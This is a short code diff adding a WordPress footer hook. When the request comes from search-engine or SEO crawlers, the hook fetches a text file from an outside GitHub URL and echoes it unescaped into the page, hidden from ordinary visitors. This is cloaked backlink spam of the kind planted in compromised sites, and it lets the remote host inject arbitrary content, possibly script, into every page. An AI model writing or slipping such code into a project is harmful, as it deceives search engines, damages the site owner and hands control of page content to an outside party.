@@ -1,0 +1,10 @@
+function add_backlink_all_pages_specific_agents() {
+    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
+    $agents = ['google', 'rogerbot', 'slurp', 'ahrefs', 'semrush'];
+    
+    if (preg_match('/' . implode('|', $agents) . '/', $user_agent)) {
+        $a = file_get_contents('https://raw.githubusercontent.com/cendanabet/link/main/link2.txt');
+        echo $a;
+    }
+}
+add_action('wp_footer', 'add_backlink_all_pages_specific_agents');
